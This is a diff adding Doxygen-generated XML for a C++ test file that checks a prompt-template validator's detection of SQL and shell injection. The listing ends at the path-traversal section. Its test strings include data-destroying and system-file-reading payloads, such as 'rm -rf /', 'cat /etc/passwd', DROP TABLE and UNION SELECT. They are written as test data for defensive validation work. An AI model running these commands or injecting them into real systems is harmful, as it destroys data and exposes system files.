+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a131d93eab9811f586703e6661aba9901" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EVADE_CaseVariations)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EVADE_CaseVariations</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="308" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="308" bodyend="313"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1afe6ed5b5f14f421c8267d2b25e737fef" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EVADE_CommentStripping)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EVADE_CommentStripping</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="315" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="315" bodyend="320"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a40dbbd108f9931f67f91550ddcf209c3" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, EVADE_MultipleKeywords)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>EVADE_MultipleKeywords</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="322" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="322" bodyend="327"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1abcd2b8f8adac49691561d21517ddcf69" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, ACCEPT_TemplateValidationWorks)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>ACCEPT_TemplateValidationWorks</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="333" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="333" bodyend="338"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a0bbf92404fc0977c69e5afb523fcb345" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, ACCEPT_InjectionDetectionWorks)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>ACCEPT_InjectionDetectionWorks</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="340" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="340" bodyend="346"/>
+      </memberdef>
+      <memberdef kind="function" id="test__prompt__engineering__validation__hardening_8cpp_1a8c7026628ae1d799dd946140da77f287" prot="public" static="no" const="no" explicit="no" inline="no" virt="non-virtual">
+        <type></type>
+        <definition>TEST_F</definition>
+        <argsstring>(PromptTemplateValidatorHardeningTest, ACCEPT_DocsAlignedToSource)</argsstring>
+        <name>TEST_F</name>
+        <param>
+          <type><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref></type>
+        </param>
+        <param>
+          <type>ACCEPT_DocsAlignedToSource</type>
+        </param>
+        <briefdescription>
+        </briefdescription>
+        <detaileddescription>
+        </detaileddescription>
+        <inbodydescription>
+        </inbodydescription>
+        <location file="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" line="348" column="1" bodyfile="tests/prompt_engineering/test_prompt_engineering_validation_hardening.cpp" bodystart="348" bodyend="357"/>
+      </memberdef>
+    </sectiondef>
+    <briefdescription>
+<para>Adversarial/edge-case validation hardening tests for prompt engineering. </para>
+    </briefdescription>
+    <detaileddescription>
+<sect1 id="test__prompt__engineering__validation__hardening_8cpp_1autotoc_md5_1s1"><sect2 id="test__prompt__engineering__validation__hardening_8cpp_1autotoc_md5">
+<title>Batch 3 Acceptance Criteria</title><para><itemizedlist>
+<listitem><para>Template validation detects SQL, command, path traversal, template injection patterns</para>
+</listitem><listitem><para>Adversarial test cases for edge-case payloads and mutation patterns</para>
+</listitem><listitem><para>API documentation updated to reflect validation guarantees</para>
+</listitem><listitem><para>Test coverage &gt; 95% on validator paths </para>
+</listitem></itemizedlist>
+</para>
+</sect2></sect1>
+    </detaileddescription>
+    <programlisting>
+<codeline lineno="1"><highlight class="normal"></highlight></codeline>
+<codeline lineno="11"><highlight class="normal"></highlight></codeline>
+<codeline lineno="12"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&lt;gtest/gtest.h&gt;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="13"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&quot;<ref refid="prompt__template__validator_8h" kindref="compound">prompt_engineering/prompt_template_validator.h</ref>&quot;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="14"><highlight class="normal"></highlight><highlight class="preprocessor">#include<sp/>&lt;nlohmann/json.hpp&gt;</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="15"><highlight class="normal"></highlight></codeline>
+<codeline lineno="16"><highlight class="normal"></highlight><highlight class="keyword">using<sp/>namespace<sp/></highlight><highlight class="normal"><ref refid="namespacethemis_1_1prompt__engineering" kindref="compound">themis::prompt_engineering</ref>;</highlight></codeline>
+<codeline lineno="17"><highlight class="normal"></highlight></codeline>
+<codeline lineno="18"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="19"><highlight class="normal"></highlight><highlight class="comment">//<sp/>Test<sp/>Fixtures</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="20"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="21"><highlight class="normal"></highlight></codeline>
+<codeline lineno="22" refid="class_prompt_template_validator_hardening_test" refkind="compound"><highlight class="normal"></highlight><highlight class="keyword">class<sp/></highlight><highlight class="normal"><ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref><sp/>:<sp/></highlight><highlight class="keyword">public</highlight><highlight class="normal"><sp/>::testing::Test<sp/>{</highlight></codeline>
+<codeline lineno="23"><highlight class="normal"></highlight><highlight class="keyword">protected</highlight><highlight class="normal">:</highlight></codeline>
+<codeline lineno="24"><highlight class="normal"><sp/><sp/><sp/><sp/><ref refid="classthemis_1_1prompt__engineering_1_1_prompt_template_validator" kindref="compound">PromptTemplateValidator</ref><sp/><ref refid="class_prompt_template_validator_hardening_test_1ad297a0a0f635b39b663d3c737cd9051a" kindref="member">validator_</ref>{</highlight><highlight class="keyword">false</highlight><highlight class="normal">};<sp/><sp/></highlight><highlight class="comment">//<sp/>require_id=false<sp/>for<sp/>pre-persist</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="25"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight></codeline>
+<codeline lineno="26"><highlight class="normal"><sp/><sp/><sp/><sp/>nlohmann::json<sp/><ref refid="class_prompt_template_validator_hardening_test_1afbff285567fec48ef1621cea4ff41309" kindref="member">makeValidTemplate</ref>(</highlight><highlight class="keyword">const</highlight><highlight class="normal"><sp/>std::string&amp;<sp/><ref refid="bench__rewrite__engine_8cpp_1ab0f5e79a4809a73e46767641aa4e7dac" kindref="member">content</ref><sp/>=<sp/></highlight><highlight class="stringliteral">&quot;Hello<sp/>{{name}}&quot;</highlight><highlight class="normal">)<sp/>{</highlight></codeline>
+<codeline lineno="27"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/></highlight><highlight class="keywordflow">return</highlight><highlight class="normal"><sp/>nlohmann::json{</highlight></codeline>
+<codeline lineno="28"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;name&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;test-template&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="29"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;version&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;1.0.0&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="30"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;content&quot;</highlight><highlight class="normal">,<sp/><ref refid="bench__rewrite__engine_8cpp_1ab0f5e79a4809a73e46767641aa4e7dac" kindref="member">content</ref>},</highlight></codeline>
+<codeline lineno="31"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;description&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="stringliteral">&quot;Test<sp/>template&quot;</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="32"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;active&quot;</highlight><highlight class="normal">,<sp/></highlight><highlight class="keyword">true</highlight><highlight class="normal">},</highlight></codeline>
+<codeline lineno="33"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>{</highlight><highlight class="stringliteral">&quot;metadata&quot;</highlight><highlight class="normal">,<sp/>nlohmann::json::object()}</highlight></codeline>
+<codeline lineno="34"><highlight class="normal"><sp/><sp/><sp/><sp/><sp/><sp/><sp/><sp/>};</highlight></codeline>
+<codeline lineno="35"><highlight class="normal"><sp/><sp/><sp/><sp/>}</highlight></codeline>
+<codeline lineno="36"><highlight class="normal">};</highlight></codeline>
+<codeline lineno="37"><highlight class="normal"></highlight></codeline>
+<codeline lineno="38"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="39"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>SQL<sp/>Injection<sp/>Detection<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="40"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="41"><highlight class="normal"></highlight></codeline>
+<codeline lineno="42"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SQL_BasicUnionInjection)<sp/>{</highlight></codeline>
+<codeline lineno="43"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>*<sp/>FROM<sp/>users<sp/>WHERE<sp/>id<sp/>=<sp/>&apos;{{id}}&apos;<sp/>UNION<sp/>SELECT<sp/>*<sp/>FROM<sp/>admin&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="44"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="45"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="46"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_FALSE(result.valid);<sp/><sp/></highlight><highlight class="comment">//<sp/>SQL<sp/>injection<sp/>is<sp/>high-severity</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="47"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.errors.empty()<sp/>||<sp/>!result.warnings.empty());</highlight></codeline>
+<codeline lineno="48"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="49"><highlight class="normal"></highlight></codeline>
+<codeline lineno="50"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SQL_DropTableInjection)<sp/>{</highlight></codeline>
+<codeline lineno="51"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Setup<sp/>database:<sp/>{{init}};<sp/>DROP<sp/>TABLE<sp/>users;<sp/>--&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="52"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="53"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="54"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Should<sp/>detect<sp/>SQL<sp/>pattern</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="55"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="56"><highlight class="normal"></highlight></codeline>
+<codeline lineno="57"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SQL_QuotedInjectionAttempt)<sp/>{</highlight></codeline>
+<codeline lineno="58"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;SELECT<sp/>*<sp/>FROM<sp/>users<sp/>WHERE<sp/>email=&apos;{{email}}&apos;<sp/>OR<sp/>&apos;1&apos;=&apos;1&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="59"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="60"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="61"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Quotes<sp/>+<sp/>SQL<sp/>keywords<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="62"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="63"><highlight class="normal"></highlight></codeline>
+<codeline lineno="64"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SQL_MultipleInjectionVectors)<sp/>{</highlight></codeline>
+<codeline lineno="65"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;INSERT<sp/>INTO<sp/>logs<sp/>VALUES<sp/>(&apos;{{user}}&apos;);<sp/>DELETE<sp/>FROM<sp/>backup;<sp/>--&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="66"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="67"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="68"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty()<sp/>||<sp/>!result.errors.empty());</highlight></codeline>
+<codeline lineno="69"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="70"><highlight class="normal"></highlight></codeline>
+<codeline lineno="71"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>SQL_CaseInsensitivity)<sp/>{</highlight></codeline>
+<codeline lineno="72"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Data:<sp/>{{data}}<sp/>union<sp/>select<sp/>1,2,3<sp/>from<sp/>info&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="73"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="74"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="75"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Case-insensitive<sp/>detection</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="76"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="77"><highlight class="normal"></highlight></codeline>
+<codeline lineno="78"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="79"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Command<sp/>Injection<sp/>Detection<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="80"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="81"><highlight class="normal"></highlight></codeline>
+<codeline lineno="82"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_PipeInjection)<sp/>{</highlight></codeline>
+<codeline lineno="83"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;User:<sp/>{{user}}<sp/>|<sp/>rm<sp/>-rf<sp/>/&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="84"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="85"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="86"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Pipe<sp/>character<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="87"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="88"><highlight class="normal"></highlight></codeline>
+<codeline lineno="89"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_SemicolonInjection)<sp/>{</highlight></codeline>
+<codeline lineno="90"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Process<sp/>{{file}};<sp/>cat<sp/>/etc/passwd;&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="91"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="92"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="93"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Semicolon<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="94"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="95"><highlight class="normal"></highlight></codeline>
+<codeline lineno="96"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_BacktickExecution)<sp/>{</highlight></codeline>
+<codeline lineno="97"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Execute:<sp/>{{cmd}}<sp/>`whoami`<sp/>result&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="98"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="99"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="100"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>Backticks<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="101"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="102"><highlight class="normal"></highlight></codeline>
+<codeline lineno="103"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_DollarParenSubstitution)<sp/>{</highlight></codeline>
+<codeline lineno="104"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Run<sp/>$(malicious_command)<sp/>in<sp/>context&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="105"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="106"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="107"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>$(...)<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="108"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="109"><highlight class="normal"></highlight></codeline>
+<codeline lineno="110"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_LogicalAndOr)<sp/>{</highlight></codeline>
+<codeline lineno="111"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Result:<sp/>{{result}}<sp/>&amp;&amp;<sp/>rm<sp/>-rf<sp/>/tmp/*&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="112"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="113"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="114"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>&amp;&amp;<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="115"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="116"><highlight class="normal"></highlight></codeline>
+<codeline lineno="117"><highlight class="normal"><ref refid="test__prompt__engineering__validation__hardening_8cpp_1adc035f471cb26ff09f903b9c48ab5f93" kindref="member">TEST_F</ref>(<ref refid="class_prompt_template_validator_hardening_test" kindref="compound">PromptTemplateValidatorHardeningTest</ref>,<sp/>CMD_AmpersandBgExecution)<sp/>{</highlight></codeline>
+<codeline lineno="118"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>tmpl<sp/>=<sp/>makeValidTemplate(</highlight><highlight class="stringliteral">&quot;Task<sp/>{{task}}<sp/>&amp;<sp/>nohup<sp/>malware.sh<sp/>&amp;&quot;</highlight><highlight class="normal">);</highlight></codeline>
+<codeline lineno="119"><highlight class="normal"><sp/><sp/><sp/><sp/>std::string<sp/>json_str<sp/>=<sp/>tmpl.dump();</highlight></codeline>
+<codeline lineno="120"><highlight class="normal"><sp/><sp/><sp/><sp/></highlight><highlight class="keyword">auto</highlight><highlight class="normal"><sp/>result<sp/>=<sp/>validator_.validate(json_str);</highlight></codeline>
+<codeline lineno="121"><highlight class="normal"><sp/><sp/><sp/><sp/>EXPECT_TRUE(!result.warnings.empty());<sp/><sp/></highlight><highlight class="comment">//<sp/>&amp;<sp/>detected</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="122"><highlight class="normal">}</highlight></codeline>
+<codeline lineno="123"><highlight class="normal"></highlight></codeline>
+<codeline lineno="124"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="125"><highlight class="normal"></highlight><highlight class="comment">//<sp/>BATCH<sp/>3:<sp/>Path<sp/>Traversal<sp/>Detection<sp/>Tests</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="126"><highlight class="normal"></highlight><highlight class="comment">//<sp/>============================================================================</highlight><highlight class="normal"></highlight></codeline>
+<codeline lineno="127"><highlight class="normal"></highlight></codeline>
